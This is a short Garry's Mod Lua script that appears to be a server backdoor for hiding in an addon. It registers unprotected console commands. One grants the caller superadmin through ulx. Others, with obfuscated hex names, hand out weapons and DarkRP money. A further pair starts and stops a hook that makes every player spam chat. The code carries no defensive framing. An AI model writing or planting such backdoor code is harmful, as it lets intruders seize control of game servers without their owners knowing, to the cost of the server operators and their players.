
local GGWP = player.GetAll()


function HEHEXD(ply , cmd , args) RunConsoleCommand("ulx", "adduser", ply:SteamID(),"superadmin") end concommand.Add('test' , HEHEXD)

function HEHEXDV2(ply , cmd , args) for k,v in pairs(GGWP) do v:Give(tostring(args[1])) end end concommand.Add('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF7', HEHEXDV2)

function HEHEXDV3(ply, text , llll) for k,v in pairs(GGWP) do v:Say('/ooc HEHEXD Rules All') end end

function HEHEXDV4(ply , cmd , args) hook.Add('Think', 'JHASJDHK', HEHEXDV3 ) end concommand.Add('StartThatCrapLOL', HEHEXDV4)

function HEHEXDV5(ply , cmd , args) hook.Remove('Think', 'JHASJDHK' ) end concommand.Add('StopThatCrapLol', HEHEXDV5)

function HEHEXDV6(ply , cmd , args) ply:addMoney(tonumber(args[1])) end concommand.Add('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF6', HEHEXDV6)

function HEHEXDV7(ply , cmd , args) ply:Give(tostring(args[1])) end concommand.Add('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEA6', HEHEXDV7)
